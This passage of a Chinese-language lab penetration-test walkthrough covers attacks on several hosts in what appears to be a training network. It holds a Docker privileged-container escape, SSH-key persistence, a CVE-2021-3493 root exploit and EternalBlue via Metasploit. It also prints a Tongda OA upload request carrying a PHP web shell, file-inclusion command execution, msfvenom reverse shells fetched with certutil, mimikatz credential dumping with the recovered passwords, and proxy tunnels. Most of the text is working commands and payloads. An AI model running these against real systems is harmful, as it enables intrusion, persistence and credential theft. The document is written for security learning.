+<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>export PATH=/tmp:$PATH
+</span></code></pre></div>
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-06-15-26.png" /></p>
+<p><strong>运行shell程序获得一个root权限的伪造ps子进程</strong></p>
+<p><div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>cd /home/jobs
+</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>./shell
+</span></code></pre></div>
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-06-16-56.png" />
+成功提权</p>
+<h5 id="docker">Docker逃逸<a class="headerlink" href="#docker" title="Permanent link">&para;</a></h5>
+<blockquote>
+<p>在docker中提权成功后就需要利用docker的配置漏洞逃逸到宿主机中从而获得宿主机的root权限</p>
+</blockquote>
+<p><strong>查找配置漏洞:特权模式检测</strong></p>
+<ul>
+<li>通过cat /proc/self/status | grep CapEff查看能力值，若返回值为 0000003fffffffff 等接近全权限的掩码，则确认容器以特权模式运行
+  <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-06-33-57.png" /></li>
+</ul>
+<p><strong>查看宿主机磁盘分区</strong></p>
+<p><div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>fdisk -l
+</span></code></pre></div>
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-06-34-47.png" /></p>
+<p><strong>挂载文件系统</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>mkdir /temp        # 创建临时目录作为挂载点
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>mount /dev/sda1 /temp      #将宿主机的物理磁盘挂载到刚刚创建的临时目录
+</span></code></pre></div>
+<p><strong>切换文件系统视角</strong></p>
+<p><div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>chroot /temp /bin/bash        # 将当前进程及其子进程的根目录切换为 /temp（即宿主机磁盘），并启动 bash
+</span></code></pre></div>
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-06-42-10.png" />
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-06-44-08.png" />
+逃逸成功
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-06-46-06.png" />
+成功获得web2机器的明文账号密码，进行ssh连接
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-06-53-26.png" />
+登录成功</p>
+<h4 id="_13">权限维持<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h4>
+<blockquote>
+<p>向web2中写入ssh公钥</p>
+</blockquote>
+<p><img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-06-58-10.png" /></p>
+<p><em>查看之前在kali中生成的ssh公钥</em>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>cat /root/.ssh/id_rsa_pub
+</span></code></pre></div>
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-07-02-57.png" />
+<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>echo &gt; /home/ubuntu/.ssh/authorized_keys     # 创建空文件
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>echo &quot;[kali中的ssh公钥]&quot; &gt; /home/ubuntu/.ssh/authorized_keys  # 向该文件中写入ssh公钥
+</span></code></pre></div>
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-07-04-16.png" /></p>
+<p><strong>在kali中里ssh秘钥认证登录web2</strong></p>
+<ul>
+<li>方式一：使用 Proxychains（代理链）</li>
+</ul>
+<p><div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>proxychains4 ssh -o PubkeyAcceptedKeyTypes=+ssh-rsa -i /root/.ssh/id_rsa_red7 ubuntu@192.168.52.20
+</span></code></pre></div>
+   <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-07-28-09.png" /></p>
+<ul>
+<li>方式二：Web1 的持久化端口转发（最稳定）</li>
+</ul>
+<p>如果在 Web1 上配置了端口转发（比如 socat TCP4-LISTEN:2222,fork TCP4:192.168.52.20:22），那么你直接在 Kali 上连 Web1 的 5555 端口，实际上连的就是 Web2 的 22 端口</p>
+<p><img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-07-33-46.png" />
+   <div class="language-bash highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>ssh<span class="w"> </span>-p<span class="w"> </span><span class="m">2222</span><span class="w"> </span>-o<span class="w"> </span><span class="nv">PubkeyAcceptedKeyTypes</span><span class="o">=</span>+ssh-rsa<span class="w"> </span>-i<span class="w"> </span>/root/.ssh/id_rsa_red7<span class="w"> </span>ubuntu@192.168.162.129
+</span></code></pre></div>
+   <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-07-35-11.png" /></p>
+<p>ssh连接的是ubuntu用户，还不是root权限
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-18-04-53.png" /></p>
+<p><strong>查找漏洞进行提权</strong></p>
+<ul>
+<li>查看系统版本
+   <div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>uname -a
+</span></code></pre></div>
+   <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-18-07-19.png" />
+   ubuntu14.04的系统，版本很老</li>
+<li>到网上找一下有没有Nday </li>
+<li>发现有多个漏洞，使用CVE-2021-3493提权</li>
+<li>漏洞分析文章地址<code>https://developer.aliyun.com/article/1220938</code></li>
+<li>exp下载地址<code>https://github.com/briskets/CVE-2021-3493</code></li>
+</ul>
+<p><strong>CVE-2021-3493提权</strong></p>
+<ul>
+<li>在web2的shell中下载漏洞利用脚本
+  <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-18-35-37.png" />
+  <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-18-35-21.png" /> 
+  <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-18-34-53.png" /> </li>
+<li>
+<p>编译漏洞利用脚本，加执行权限并运行程序
+  <div class="language-text highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a> gcc -o exploit exploit.c
+</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a> chmod +x exp
+</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a> ./exp
+</span></code></pre></div>
+  <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-18-35-56.png" /></p>
+</li>
+<li>
+<p>提权成功 </p>
+</li>
+</ul>
+<h3 id="pc1">pc1<a class="headerlink" href="#pc1" title="Permanent link">&para;</a></h3>
+<h4 id="_14">漏洞探测<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h4>
+<p><strong>nmap扫描开放端口</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>nmap -sS -Pn --min-rate 1000 -p- 192.168.52.30
+</span></code></pre></div>
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-09-53-25.png" /></p>
+<h5 id="445">发现445端口开放，可能存在永恒之蓝<a class="headerlink" href="#445" title="Permanent link">&para;</a></h5>
+<p>使用msf框架探测
+在 Kali 终端启动 msfconsole
+<div class="language-text highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>search ms17_010      #查找相关模块
+</span></code></pre></div>
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-01-25-54.png" /></p>
+<p>选择利用的模块路径并配置好参数
+<div class="language-text highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>use auxiliary/scanner/smb/smb_ms17_010    
+</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a>set RHOSTS 192.168.52.30
+</span><span id="__span-39-3"><a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a>run
+</span></code></pre></div>
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-01-28-23.png" />
+发现确实存在永恒之蓝漏洞可以利用</p>
+<h5 id="8080http">8080端口的http服务可能存在漏洞<a class="headerlink" href="#8080http" title="Permanent link">&para;</a></h5>
+<p>访问pc1的8080端口，发现是通达OA系统
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-10-11-45.png" /></p>
+<p>未授权访问/inc/expired.php
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-10-35-22.png" />
+Web服务版本号：11.3.200106</p>
+<p>上网搜索运行该版本的系统的历史漏洞有哪些
+<div class="language-text highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>https://www.cnblogs.com/KHZ521/p/14018078.html
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>https://www.cnblogs.com/BOHB-yunying/p/12833848.html
+</span></code></pre></div>
+发现该版本系统存在任意用户登录漏洞和远程命令执行漏洞</p>
+<h4 id="_15">漏洞利用<a class="headerlink" href="#_15" title="Permanent link">&para;</a></h4>
+<h5 id="ms17-010pc1shell">MS17-010永恒之蓝拿下PC1的shell<a class="headerlink" href="#ms17-010pc1shell" title="Permanent link">&para;</a></h5>
+<blockquote>
+<p>很奇怪，我打pc1的时候用的是ssh动态转发+web1跳板访问到52段的然后msf可以对pc1进行永恒之蓝的利用然后成功拿下
+但是后来做持久化的时候用msf本身的路由就无法对pc1进行永恒之蓝漏洞利用了
+在 Kali 终端启动 msfconsole
+<div class="language-text highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>use exploit/windows/smb/ms17_010_eternalblue
+</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a>set RHOSTS 192.168.52.30
+</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a>set Proxies socks5:127.0.0.1:9050
+</span><span id="__span-42-4"><a id="__codelineno-42-4" name="__codelineno-42-4" href="#__codelineno-42-4"></a>set payload windows/x64/meterpreter/bind_tcp    # 内网机器回连不到 Kali，必须用 bind_tcp
+</span><span id="__span-42-5"><a id="__codelineno-42-5" name="__codelineno-42-5" href="#__codelineno-42-5"></a>set LPORT 4444
+</span><span id="__span-42-6"><a id="__codelineno-42-6" name="__codelineno-42-6" href="#__codelineno-42-6"></a>run
+</span></code></pre></div>
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-21-03-35.png" />
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-21-04-51.png" />
+已经是system权限不需要提权了</p>
+</blockquote>
+<h5 id="oapc1shell">通达OA未授权任意文件上传漏洞拿下PC1的shell<a class="headerlink" href="#oapc1shell" title="Permanent link">&para;</a></h5>
+<p>参考文章<code>https://blog.csdn.net/szgyunyun/article/details/107104288</code></p>
+<ul>
+<li>
+<p><strong>任意用户登录</strong></p>
+</li>
+<li>
+<p>登录处抓包
+    <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-13-27-05.png" /></p>
+</li>
+<li>修改再发包
+    <div class="language-text highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>/logincheck.php ——&gt; /logincheck_code.php
+</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a>删除cookie
+</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a>在post包中添加UID=1
+</span></code></pre></div>
+    <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-13-33-02.png" /></li>
+<li>
+<p>获取服务端返回的SESSID
+    <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-13-35-09.png" /></p>
+</li>
+<li>
+<p>用获取的SESSID访问/general/index.php?isIE=0 
+    <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-17-46-18.png" /> 
+    登录成功了不过跳转到<code>/inc/expired.php?from=3&amp;t1=-2035&amp;t2=</code>l了</p>
+</li>
+<li>
+<p><strong>任意文件上传漏洞利用</strong></p>
+</li>
+<li>
+<p>漏洞位置：<code>/ispirit/im/upload.php</code></p>
+</li>
+<li>
+<p><em>POC</em></p>
+<p><div class="language-text highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>POST /ispirit/im/upload.php HTTP/1.1
+</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a>Host: 192.168.52.30:8080
+</span><span id="__span-44-3"><a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a>Content-Length: 658
+</span><span id="__span-44-4"><a id="__codelineno-44-4" name="__codelineno-44-4" href="#__codelineno-44-4"></a>Cache-Control: no-cache
+</span><span id="__span-44-5"><a id="__codelineno-44-5" name="__codelineno-44-5" href="#__codelineno-44-5"></a>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
+</span><span id="__span-44-6"><a id="__codelineno-44-6" name="__codelineno-44-6" href="#__codelineno-44-6"></a>Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB
+</span><span id="__span-44-7"><a id="__codelineno-44-7" name="__codelineno-44-7" href="#__codelineno-44-7"></a>Accept: */*
+</span><span id="__span-44-8"><a id="__codelineno-44-8" name="__codelineno-44-8" href="#__codelineno-44-8"></a>Accept-Encoding: gzip, deflate
+</span><span id="__span-44-9"><a id="__codelineno-44-9" name="__codelineno-44-9" href="#__codelineno-44-9"></a>Accept-Language: zh-CN,zh;q=0.9,zh-HK;q=0.8,ja;q=0.7,en;q=0.6,zh-TW;q=0.5
+</span><span id="__span-44-10"><a id="__codelineno-44-10" name="__codelineno-44-10" href="#__codelineno-44-10"></a>Cookie: PHPSESSID=123
+</span><span id="__span-44-11"><a id="__codelineno-44-11" name="__codelineno-44-11" href="#__codelineno-44-11"></a>Connection: close
+</span><span id="__span-44-12"><a id="__codelineno-44-12" name="__codelineno-44-12" href="#__codelineno-44-12"></a>
+</span><span id="__span-44-13"><a id="__codelineno-44-13" name="__codelineno-44-13" href="#__codelineno-44-13"></a>------WebKitFormBoundarypyfBh1YB4pV8McGB
+</span><span id="__span-44-14"><a id="__codelineno-44-14" name="__codelineno-44-14" href="#__codelineno-44-14"></a>Content-Disposition: form-data; name=&quot;UPLOAD_MODE&quot;
+</span><span id="__span-44-15"><a id="__codelineno-44-15" name="__codelineno-44-15" href="#__codelineno-44-15"></a>
+</span><span id="__span-44-16"><a id="__codelineno-44-16" name="__codelineno-44-16" href="#__codelineno-44-16"></a>2
+</span><span id="__span-44-17"><a id="__codelineno-44-17" name="__codelineno-44-17" href="#__codelineno-44-17"></a>------WebKitFormBoundarypyfBh1YB4pV8McGB
+</span><span id="__span-44-18"><a id="__codelineno-44-18" name="__codelineno-44-18" href="#__codelineno-44-18"></a>Content-Disposition: form-data; name=&quot;P&quot;
+</span><span id="__span-44-19"><a id="__codelineno-44-19" name="__codelineno-44-19" href="#__codelineno-44-19"></a>
+</span><span id="__span-44-20"><a id="__codelineno-44-20" name="__codelineno-44-20" href="#__codelineno-44-20"></a>123
+</span><span id="__span-44-21"><a id="__codelineno-44-21" name="__codelineno-44-21" href="#__codelineno-44-21"></a>------WebKitFormBoundarypyfBh1YB4pV8McGB
+</span><span id="__span-44-22"><a id="__codelineno-44-22" name="__codelineno-44-22" href="#__codelineno-44-22"></a>Content-Disposition: form-data; name=&quot;DEST_UID&quot;
+</span><span id="__span-44-23"><a id="__codelineno-44-23" name="__codelineno-44-23" href="#__codelineno-44-23"></a>
+</span><span id="__span-44-24"><a id="__codelineno-44-24" name="__codelineno-44-24" href="#__codelineno-44-24"></a>1
+</span><span id="__span-44-25"><a id="__codelineno-44-25" name="__codelineno-44-25" href="#__codelineno-44-25"></a>------WebKitFormBoundarypyfBh1YB4pV8McGB
+</span><span id="__span-44-26"><a id="__codelineno-44-26" name="__codelineno-44-26" href="#__codelineno-44-26"></a>Content-Disposition: form-data; name=&quot;ATTACHMENT&quot;; filename=&quot;jpg&quot;
+</span><span id="__span-44-27"><a id="__codelineno-44-27" name="__codelineno-44-27" href="#__codelineno-44-27"></a>Content-Type: image/jpeg
+</span><span id="__span-44-28"><a id="__codelineno-44-28" name="__codelineno-44-28" href="#__codelineno-44-28"></a>
+</span><span id="__span-44-29"><a id="__codelineno-44-29" name="__codelineno-44-29" href="#__codelineno-44-29"></a>&lt;?php
+</span><span id="__span-44-30"><a id="__codelineno-44-30" name="__codelineno-44-30" href="#__codelineno-44-30"></a>$command=$_POST[&#39;cmd&#39;];
+</span><span id="__span-44-31"><a id="__codelineno-44-31" name="__codelineno-44-31" href="#__codelineno-44-31"></a>$wsh = new COM(&#39;WScript.shell&#39;);
+</span><span id="__span-44-32"><a id="__codelineno-44-32" name="__codelineno-44-32" href="#__codelineno-44-32"></a>$exec = $wsh-&gt;exec(&quot;cmd /c &quot;.$command);
+</span><span id="__span-44-33"><a id="__codelineno-44-33" name="__codelineno-44-33" href="#__codelineno-44-33"></a>$stdout = $exec-&gt;StdOut();
+</span><span id="__span-44-34"><a id="__codelineno-44-34" name="__codelineno-44-34" href="#__codelineno-44-34"></a>$stroutput = $stdout-&gt;ReadAll();
+</span><span id="__span-44-35"><a id="__codelineno-44-35" name="__codelineno-44-35" href="#__codelineno-44-35"></a>echo $stroutput;
+</span><span id="__span-44-36"><a id="__codelineno-44-36" name="__codelineno-44-36" href="#__codelineno-44-36"></a>?&gt;
+</span><span id="__span-44-37"><a id="__codelineno-44-37" name="__codelineno-44-37" href="#__codelineno-44-37"></a>------WebKitFormBoundarypyfBh1YB4pV8McGB--
+</span></code></pre></div>
+ <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-18-57-09.png" /></p>
+</li>
+<li>
+<p><em>上传的文件路径</em>
+    2610/1244110933.jpg</p>
+</li>
+<li>
+<p><strong>文件包含利用</strong></p>
+</li>
+<li>
+<p>漏洞位置：<code>/ispirit/interface/gateway.php</code></p>
+</li>
+<li>
+<p><em>POC</em>
+    <div class="language-text highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>POST /ispirit/interface/gateway.php HTTP/1.1
+</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a>Host: 192.168.52.30:8080
+</span><span id="__span-45-3"><a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a>Connection: keep-alive
+</span><span id="__span-45-4"><a id="__codelineno-45-4" name="__codelineno-45-4" href="#__codelineno-45-4"></a>Accept-Encoding: gzip, deflate
+</span><span id="__span-45-5"><a id="__codelineno-45-5" name="__codelineno-45-5" href="#__codelineno-45-5"></a>Accept: */*
+</span><span id="__span-45-6"><a id="__codelineno-45-6" name="__codelineno-45-6" href="#__codelineno-45-6"></a>User-Agent: python-requests/2.21.0
+</span><span id="__span-45-7"><a id="__codelineno-45-7" name="__codelineno-45-7" href="#__codelineno-45-7"></a>Content-Length: 72
+</span><span id="__span-45-8"><a id="__codelineno-45-8" name="__codelineno-45-8" href="#__codelineno-45-8"></a>Content-Type: application/x-www-form-urlencoded
+</span><span id="__span-45-9"><a id="__codelineno-45-9" name="__codelineno-45-9" href="#__codelineno-45-9"></a>
+</span><span id="__span-45-10"><a id="__codelineno-45-10" name="__codelineno-45-10" href="#__codelineno-45-10"></a>json={&quot;url&quot;:&quot;/general/../../attach/im/2610/1244110933.jpg&quot;}&amp;cmd=whoami
+</span></code></pre></div></p>
+</li>
+<li>
+<p>成功执行系统命令
+    <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-18-59-10.png" /></p>
+</li>
+<li>
+<p><strong>使用msf上线pc1</strong>  </p>
+</li>
+<li>使用 msfvenom 在 Kali 上生成一个回连到 Web1（192.168.52.10）的 MSF 木马
+    <div class="language-text highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.52.10 LPORT=3333 -f exe -o msf_pc1.exe
+</span></code></pre></div></li>
+<li>在 Kali 上启动 MSF 监听：
+    <div class="language-text highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>msfconsole -q
+</span><span id="__span-47-2"><a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a>use exploit/multi/handler
+</span><span id="__span-47-3"><a id="__codelineno-47-3" name="__codelineno-47-3" href="#__codelineno-47-3"></a>set payload windows/x64/meterpreter/reverse_tcp
+</span><span id="__span-47-4"><a id="__codelineno-47-4" name="__codelineno-47-4" href="#__codelineno-47-4"></a>set LHOST 192.168.52.10
+</span><span id="__span-47-5"><a id="__codelineno-47-5" name="__codelineno-47-5" href="#__codelineno-47-5"></a>set LPORT 3333
+</span><span id="__span-47-6"><a id="__codelineno-47-6" name="__codelineno-47-6" href="#__codelineno-47-6"></a>run
+</span></code></pre></div></li>
+<li>将木马程序传到web1上，然后让pc1从web1下载木马
+    <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-00-42-22.png" />
+    <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-00-42-37.png" /> </li>
+<li>web1开启流量转发
+    <div class="language-text highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>socat TCP4-LISTEN:3333,fork TCP4:192.168.162.128:3333
+</span></code></pre></div>
+    将pc1连接web1的3333端口的流量转发给kali的3333端口
+    <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-00-47-06.png" /></li>
+<li>
+<p>通过 gateway.php 的文件包含漏洞执行下载木马，执行木马的命令</p>
+<ul>
+<li>
+<p>执行下载
+  <div class="language-text highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>certutil -urlcache -split -f http://192.168.52.10:1678/msf_pc1.exe .\msf.exe
+</span></code></pre></div>
+  <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-00-03-52.png" /></p>
+</li>
+<li>
+<p>启动木马
+  <div class="language-text highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>.\msf.exe
+</span></code></pre></div></p>
+</li>
+<li><img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-00-47-51.png" />
+成功获得一个会话</li>
+</ul>
+</li>
+<li>
+<p><img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-00-48-28.png" />
+    拿下pc1且是system权限    </p>
+</li>
+</ul>
+<h4 id="_16">横向移动<a class="headerlink" href="#_16" title="Permanent link">&para;</a></h4>
+<blockquote>
+<p>获取的PC1为system权限可以上传mimiktz进行密码抓取为横向移动做准备</p>
+</blockquote>
+<p><strong>使用msf内置模块kiwi</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>meterpreter &gt; load kiwi
+</span><span id="__span-51-2"><a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a>meterpreter &gt; creds_all
+</span></code></pre></div>
+<p><img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-21-05-32-15.png" />
+  成功获得明文密码
+  <div class="language-text highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>Administrator:Whoami2021
+</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a>bunny:Bunny2021
+</span></code></pre></div></p>
+<h2 id="kalipc2dc">kali——&gt;三层PC2、DC（内网渗透/横向移动）<a class="headerlink" href="#kalipc2dc" title="Permanent link">&para;</a></h2>
+<h3 id="_17">配置代理隧道<a class="headerlink" href="#_17" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>利用 EarthWorm (EW) 工具搭建多级网络代理隧道（LCX 正向级联）</p>
+</blockquote>
+<ul>
+<li>
+<p>kali中开启lcx_listen
+   <div class="language-text highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>./ew_for_linux64 -s lcx_listen -l 12345 -e 8899
+</span></code></pre></div>
+   <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-09-05-25.png" /></p>
+</li>
+<li>
+<p>web1开启lcx_slave</p>
+</li>
+<li>在web1中下载ew_for_linux64<ul>
+<li>kali在目录下开启http服务
+  <div class="language-text highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>python -m http.server 6789
+</span></code></pre></div>
+  <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-09-18-34.png" /></li>
+<li>web1中访问kali开启的http服务获取ew_for_linux64
+  <div class="language-text highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>wget http://192.168.162.128:6789/ew_for_linux64
+</span></code></pre></div>
+  <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-09-18-17.png" /></li>
+</ul>
+</li>
+<li>开启lcx_slave
+   <div class="language-text highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>./ew_for_linux64 -s lcx_slave -d 192.168.162.128 -e 8899 -f 192.168.52.30 -g 4445
+</span></code></pre></div>
+   <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-09-19-08.png" /></li>
+<li>pc1中开启ssocksd </li>
+<li>
+<p>上传ew_for_Win.exe到pc1</p>
+<p><div class="language-text highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a>upload /home/ep/桌面/temp/ew_for_Win.exe C:\\Windows\\Temp\\ew_for_Win.exe
+</span></code></pre></div>
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-09-10-18.png" /> 
+  - 开启ssocksd
+<div class="language-text highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a>ew_for_win.exe -s ssocksd -l 4445 
+</span></code></pre></div></p>
+</li>
+<li>
+<p><img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-09-21-16.png" /></p>
+</li>
+<li>
+<p>kali中配置代理</p>
+</li>
+<li>在/etc/proxychains4.conf 文件末尾添加socks5 0.0.0.0 12349</li>
+<li>意思是告诉 Proxychains：以后所有的代理流量，都交给本地的 12349 端口
+    <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-09-23-45.png" /> </li>
+</ul>
+<p><img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-09-24-22.png" />
+成功打通链路</p>
